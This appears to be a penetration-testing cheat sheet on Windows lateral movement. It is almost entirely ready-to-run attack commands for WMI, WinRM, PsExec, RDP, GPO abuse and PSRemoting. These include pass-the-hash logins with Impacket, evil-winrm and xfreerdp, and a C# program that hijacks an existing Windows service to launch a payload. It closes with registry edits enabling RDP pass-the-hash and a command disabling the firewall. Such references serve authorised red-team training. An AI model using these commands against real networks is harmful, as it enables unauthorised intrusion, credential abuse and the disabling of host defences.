# Lateral Movement

### WMI

#### Native

```
wmic /node:"<computername>" /user:"<domain>\<user>" /password:"<password>" process call create "powershell -enc <cmd>"
```

#### [SharpWMI](https://github.com/GhostPack/SharpWMI)

```
SharpWMI /command:"action=exec computername=<computername> command=\"c:\temp\x.exe\""
```

#### Covenant

```
WMIGrunt <computername> PowerShell
WMICommand <computername> PowerShell
```

A good way to move laterally is to generate an encoded powershell launcher and launch it via WMICommand.

#### Impacket

```
wmiexec.py <username>:'<password>'@<ip>
wmiexec.py -hashes :<ntlm hash> administrator@<ip>
```

### WinRM

#### [evil-winrm](https://github.com/Hackplayers/evil-winrm)

```
evil-winrm -i <ip> -u <domain>/<username> -p <password> -s <scriptdir>
evil-winrm -i <ip> -u <domain>/<username> -H <hash> -s <scriptdir> 
```

#### Windows native

```bash
sc start winrm
Enable-WSManCredSSP -Role "Client" -DelegateComputer "*"
```

Edit registry:

```
Computer Configuration > Administrative Templates > System > Credentials Delegation > Allow Delegating Fresh Credentials.
Computer Configuration > Administrative Templates > System > Credentials Delegation > Allow Delegating Fresh Credentials with NTLM only server authentication.
```

```bash
$user = '<user>'
$pass = ConvertTo-SecureString -AsPlainText '<password>' -Force
$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user,$pass
New-PSSession -URI http://<url>:5985/wsman -Authentication CredSSP -Credential $cred
Enter-PSSession -id <id>
```

Alternatively if we want to get a PowerShell session with the current user on a remote box we can just run:

```
Enter-PSSession -Computer <computername>
```

#### Covenant

```
PowerShellRemoting <computername> <cmd>
PowerShellRemoting <computername> <cmd> <domain> <user> <pass>
```

#### Resources

{% embed url="https://www.bloggingforlogging.com/2018/01/24/demystifying-winrm/" %}

### PsExec

Impacket:

```
psexec.py <username>:'<password>'@<ip>
psexec.py -hashes :<ntlm hash> administrator@<ip>
```

Covenant:

```
CreateRemoteService<computername> gruntsvc "<name>" c:\temp\x.exe
StartRemoteService <computername> gruntsvc
DeleteRemoteService <computername> gruntsvc
```

Metasploit has its own PSExec module as well.

We can do this in C# in a bit more elegant way, without having to copy a file & register a new service (instead we change to path of an existing one briefly).

```csharp
using System;
using System.Runtime.InteropServices;

namespace NetPsExec
{
    class Program
    {
        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);
        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword,string lpDisplayName);
        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        static void Main(string[] args)
        {
            String target = "localhost"; // can be a remote computer name
            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);
            string ServiceName = "SensorService"; // can be any service that is not in use and that we can start
            IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);
            string payload = "powershell.exe";
            bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, null, null, null, null);
            bResult = StartService(schService, 0, null);
        }
    }
}
```

A more advanced Implementation can be found in [SCShell](https://github.com/Mr-Un1k0d3r/SCShell) which even has a python version and doe some additional steps (like restoring the original path).

### RDP

This probably the easiest and most comfortable way. On Linux use xfreerdp for credssp.

```
xfreerdp /u:<username> /p:'<password>' /v:<ip>
xfreerdp /u:<username> /pth:<ntlm hash> /v:<ip>
```

On Windows we use mstsc.exe. When supplied the `/restrictedadmin` parameter, the current users Auth will be used without having to enter any creds (Network Logon, does not cache credentials). When supplying credentials, these will always be cached by windows - even after the rdp session has already ended. Restricted admin mode is disabled by default though (controlled by `HKLM:\System\CurrentControlSet\Control\Lsa` ).

#### [SharpRDP](https://github.com/0xthirteen/SharpRDP)

#### SharpRDP allows to execute commands via RDP on a remote system:

```
SharpRDP.exe computername=target.domain command="..." username=domain\user password=password exec=cmd
```

### GPO Abuse

Find all Principals that can create new GPOs:

```
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=<>,DC=<>" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
```

Find Principals that can write GP-Link attribute on OUs:

```
PowerShell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
```

Create GPO

```
New-GPO -Name 'Another Totally Legit GPO' | New-GPLink -Target 'OU=<>,OU=Workstations,DC=<>,DC=<>'
```

#### Resources

{% embed url="https://www.cyberark.com/resources/threat-research-blog/group-policies-going-rogue" %}

### PSRemoting

#### Invoke command on remote host

```bash
Invoke-Command -ComputerName <target> -Credential $cred -ScriptBlock { whoami }
```

### Enable RDP PTH as Administrator

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
netsh advfirewall set allprofiles state off
```
